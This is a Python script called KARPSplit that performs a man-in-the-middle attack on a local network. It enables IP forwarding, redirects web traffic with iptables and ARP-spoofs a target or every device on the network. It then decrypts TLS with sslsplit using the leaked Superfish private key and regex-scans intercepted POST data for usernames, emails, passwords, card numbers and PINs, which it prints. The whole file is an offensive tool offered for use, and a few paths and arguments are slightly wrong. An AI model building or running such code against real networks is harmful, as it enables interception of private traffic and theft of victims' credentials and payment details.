from subprocess import Popen, PIPE
import netifaces
import re
import time
import sys


def prep():
    f = open("/pric/sys/net/ipv4/ip_forward", 'w')
    print("1", file=f)
    f.close()
    Popen(["iptables", "-t", "NAT", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "8080"])
    Popen(["iptables", "-t", "NAT", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "443", "-j", "REDIRECT", "--to-port", "8443"])


def arpspoof(target = None):
    gws = netifaces.gateways()
    gateway = gws['default'][netifaces.AF_INET][0]
    print("Found gateway " + gateway)
    interface = "eth0"
    if target is None:
        spoofer = Popen(["arpspoof", "-i", interface, gateway])
    else:
        spoofer = Popen(["arpspoof", "-i", interface, "-t", target, gateway])
    return spoofer


def sslsplit():
    splitter = Popen(["sslsplit", "-k", "/root/superfishy-master/certificates/superfish-unprotected.key", "-c", "/root/superfishy-master/certificates/superfish.crt", "-L", "/dev/stdout", "ssl", "0.0.0.0", "8443"], stdout=PIPE)
    return splitter


def read_output(pipe):

    # https://regex101.com/r/wA9oY4/1

    # infinite loop
    while 1:
        # read all new data if any is available
        conn_details = pipe.read()
        # if there is new data
        if conn_details != "":
            p = re.compile("(POST)(.*?)(?=GET|POST|\Z)", re.DOTALL)
            results = re.findall(p, conn_details)
            # for every result
            for result in results:
                q = re.compile("(?:&|\?)((?:user|email|newcard|card|pin|pass|psw).{0,16})=(.*?)(?=&)", re.DOTALL | re.IGNORECASE)
                deets = re.findall(q, result[1])
                # if credentials are detected
                if len(deets) > 0:
                    r = re.compile("Host: (.*?)\s")
                    host = re.search(r, result[1])
                    # print the host
                    print(host.group().strip())
                    # print the credentials
                    for deet in deets:
                        print(deet[0] + ": " + deet[1])
                    # print a new line
                    print()
            time.sleep(2)


print("\nKARPSplit v0.1\n")

print("Preparing OS... ", end="")
prep()
print("Done")
if len(sys.argv) > 1:
    print("Starting ARP Spoof on " + sys.argv[1] + "... ", end="")
    arpspoof(sys.argv[1])
    print("Done")
else:
    print("Starting ARP Spoof on all devices... ", end="")
    arpspoof()
    print("Done")
time.sleep(1)
print("Starting SSLSplit... ", end="")
splitter = sslsplit()
print("Done")
time.sleep(1)
print("Starting credential scanner...")
read_output(splitter.stdout)
